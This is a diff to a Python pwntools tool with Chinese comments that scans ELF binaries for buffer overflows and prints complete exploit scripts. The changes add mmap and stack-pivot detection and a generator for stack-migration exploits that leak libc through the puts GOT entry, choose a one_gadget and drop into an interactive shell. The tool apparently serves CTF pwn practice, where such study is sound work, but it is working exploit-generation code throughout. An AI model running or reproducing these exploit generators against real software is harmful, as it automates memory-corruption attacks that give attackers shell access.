@@ -24,6 +24,9 @@ printogram_base=0
 eh_frame_addr=0
 start_offset=0
 main_addr=0
+mmap_addr=0
+stack_migration_addr=[]
+stack_migration_size=[]
 need_addr=[]
 func_flag=[]
 
@@ -47,6 +50,24 @@ def get_all(elf,file_os): #用pwntools搜素我们需要的库函数，如果是
 	print('[+]start_offset:'+hex(start_offset))
 	print('[+]main_addr:'+hex(main_addr))
 	print("")
+	#get_mmap
+	try:
+		global mmap_addr
+		mmap_addr=elf.sym["mmap"]
+	except Exception as e:
+		pass
+	else:
+		if file_os == 18:
+			print("[+]mmap found addr :"+hex(mmap_addr))
+			need_addr.append(hex(mmap_addr))
+			func_flag.append("mmap")
+		elif file_os ==20:
+			print("[+]mmap found addr :"+hex(mmap_addr-4))
+			need_addr.append(hex(mmap_addr-4))
+			func_flag.append("mmap")
+	finally:
+		pass
+
 	#get_write
 	try:
 		global write_addr
@@ -697,12 +718,21 @@ def search_call_what(elf,file_name): #库函数调用地址寻找，危险函数
 						print("")
 					finally:
 						pass
+				elif func_flag[j]=="mmap":
+					#mmap检测大小区块，权限
+					mmap_where=u64(elf.read(int(all_addr[i]-0xA),5)[1:].ljust(8,'\x00'))
+					mmap_size=u64(elf.read(int(all_addr[i]-0xF),5)[1:].ljust(8,'\x00'))
+					mmap_flags=u64(elf.read(int(all_addr[i]-0x14),5)[1:].ljust(8,'\x00'))
+					print("[+]mmap a "+hex(mmap_size)+" in "+hex(mmap_where)+" it's jurisdiction is "+hex(mmap_flags))
+					print("")
 				else:
 					print("")
 	if len(backdoor_addr):#存在后门开启后门rop构造
 		ret2backdoor(file_name,file_os)
 	if len(stackoverflow_addr) and len(backdoor_addr)==0:#存在溢出但是不存在后门，开启ret2libc rop构造
 		ret2libc(file_name,file_os)
+	if len(stack_migration_addr):#栈迁移构造，暂时只做了getshell的模板，后续开启ORW操作模板自动化生成
+		stack_migration(file_name,file_os)
 def check_read_overflow_small(elf,call_addr):
     #小数组栈溢出检测长度小于0x80而且是与0x100作差形成一个相对值赋予的，利用公式简单计算就可以得到rsi大小，rdx大小直接获取，没有进行作差计算
 	rsi=u64(elf.read(int(call_addr-0x16),4)[3:].ljust(8,'\x00'))
@@ -713,24 +743,31 @@ def check_read_overflow_small(elf,call_addr):
 	rdx_size=rdx
 	
 
-	if rdx_size>rsi_size:
+	if rdx_size>rsi_size:#判断rdx是否比数组大
 		print("[+]"+hex(call_addr)+" able_input_size : "+hex(rdx_size))
 		print("[+]"+hex(call_addr)+" buf_size : "+hex(rsi_size))
 		print("[+]have stackoverflow!")
 		stackoverflow_addr.append(call_addr)
 		stackoverflow_size.append(rsi_size+8)
 		stackoverflow_input_size.append(rdx_size)
-		if rdx_size>0x10000:
+		if 0x10<=rdx_size-rsi_size<=0x20:#判断溢出空间是否为栈迁移类型
+			stack_migration_addr.append(call_addr-0x16)
+			stack_migration_size.append(rsi_size)
+		if rdx_size>0x10000:#超大类溢出，基本上是误判，往BSS区段读写数据了，这个不好判断，以后有空了做二次判断
 			stackoverflow_addr.pop()
 			stackoverflow_size.pop()
-			stackoverflow_input_size.append(rdx_size)
+			stackoverflow_input_size.pop()
+			if len(stack_migration_addr):
+				stack_migration_addr.pop()
+				stack_migration_size.pop()
 			print("[+]waring: this is maybe an error check,just like get value from bss.")
 		else:
 			print("")
+
 	else:
 		print("")
 
-def check_read_overflow_big(elf,call_addr):
+def check_read_overflow_big(elf,call_addr): #和上面的小数组判断基本上同理
     #大数组与0x100000000作差
 	rsi=u64(elf.read(int(call_addr-0x19),7)[3:].ljust(8,'\x00'))
 	rsi_size=0x100000000-rsi
@@ -747,10 +784,16 @@ def check_read_overflow_big(elf,call_addr):
 		stackoverflow_addr.append(call_addr)
 		stackoverflow_size.append(rsi_size+8)
 		stackoverflow_input_size.append(rdx_size)
+		if 0x10<=rdx_size-rsi_size<=0x20:
+			stack_migration_addr.append(call_addr-0x19)
+			stack_migration_size.append(rsi_size)
 		if rdx_size>0x10000:
 			stackoverflow_addr.pop()
 			stackoverflow_size.pop()
-			stackoverflow_input_size.append(rdx_size)
+			stackoverflow_input_size.pop()
+			if len(stack_migration_addr):
+				stack_migration_addr.pop()
+				stack_migration_size.pop()
 			print("[+]waring: this is maybe an error check")
 		else:
 			print("")
@@ -794,13 +837,13 @@ def check_big_strcpy_overflow(elf,call_addr):
 	else:
 		print("")
 
-def check_fixed_strncpy(elf,call_addr):
+def check_fixed_strncpy(elf,call_addr):#寻找rdx参数和rdi数组大小
 	fixed_size=u64(elf.read(int(call_addr-0xB),5)[1:].ljust(8,'\x00'))
 	buf=u64(elf.read(int(call_addr-0x12),7)[3:].ljust(8,'\x00'))
 	
 	buf_size=0x100000000-buf
 	
-	if fixed_size>buf_size:
+	if fixed_size>buf_size:#rdx大于数组则为溢出，后续加入误报检测处理
 		print("[+]"+hex(call_addr)+" fixed_size : "+hex(fixed_size))
 		print("[+]"+hex(call_addr)+" buf_size : "+hex(buf_size))
 		print("[+]have strncpy overflow!")
@@ -951,6 +994,62 @@ def ret2libc(file_name,file_os):#分为Ubuntu18和别的Ubuntu，Ubuntu18加上r
 						print("r.send(payload2)")
 						print("r.interactive()")
 						print("")
+def stack_migration(file_name,file_os):#栈迁移模板，暂时只支持getshell，需要用户自行判断onegadget用哪个，因为我这个是静态分析没办法的，做不到动态内存判断寄存器
+	print("[+]Hey man,This is just a suggested template")
+	print("[+]because the stack of stack migration sometimes needs to be filled with padding to varying degrees.") 
+	print("[+]I can't guarantee that I can help you attack successfully 100%.")
+	elf=ELF(file_name)
+	bss_addr=elf.get_section_by_name('.bss').header.sh_addr
+	print('.bss===>' + str(hex(bss_addr)))
+	ret=next(elf.search(asm("ret")))
+	rdi=next(elf.search(asm("pop rdi;ret")))
+	pop_rsi_r15_ret=next(elf.search(asm("pop rsi;pop r15;ret")))
+	libc_addr="/lib/x86_64-linux-gnu/libc.so.6"
+	if elf.pie!=True:
+		if puts_addr>0:
+			for i in range(len(stack_migration_addr)):
+				payload1="payload1="+"'"+'a'+"'"+"*"+hex(stack_migration_size[i])+"+p64("+hex(bss_addr+0x200)
+				payload1+=")"+"+p64("+hex(stack_migration_addr[i])+")"
+				
+				payload2="payload2="+"'"+'a'+"'"+"*"+hex(stack_migration_size[i])+"+p64("+hex(bss_addr+0x200+stack_migration_size[i])
+				payload2+=")"+"+p64("+hex(stack_migration_addr[i])+")"
+
+				payload3="payload3=p64(0)+p64("+hex(rdi)+")"+"+p64("+hex(elf.got['puts'])+")"+"+p64("+hex(elf.plt['puts'])+")"+"+p64("+hex(stack_migration_addr[i])+")"
+
+				payload4="payload4=p64(0)*4+p64(one)"
+
+				print("[+]hay,look at me!This one=base+onegadget you should choice which onegadget is you need")
+				print("[+]the utilization point exp is:")
+				print("from pwn import *")
+				print("context.log_level='debug'")
+				print("elf=ELF("+"'"+file_name+"'"+")")
+				print("libc=ELF("+"'"+libc_addr+"'"+")")
+				print("r=process("+"'"+file_name+"'"+")")
+				print(payload1)
+				print("r.send(payload1)")
+				print("sleep(0.2)")
+				print(payload2)
+				print("r.send(payload2)")
+				print("sleep(0.2)")
+				print(payload3)
+				print("r.send(payload3)")
+				print("sleep(0.2)")
+				print("leak=u64(r.recvuntil('\x7f')[-6:].ljust(8,'\x00+'))")
+				print("base=leak-libc.sym['puts']")
+				print("sh=base+next(libc.search('/bin/sh'))")
+				print("system=base+libc.sym['system']")
+				print("'''")
+				cmd = os.popen("one_gadget /lib/x86_64-linux-gnu/libc.so.6")
+				onegadgets=cmd.read() #利用管道获取onegadgets
+				print(onegadgets)
+				print("'''")
+				print("one=base+your_choice_onegadget")
+				print(payload4)
+				print("r.send(payload4)")
+				print("r.interactive()")
+				print("")
+
+
 def banner():
 	banner='''
  ████████ ██     ██ ████████ ████████
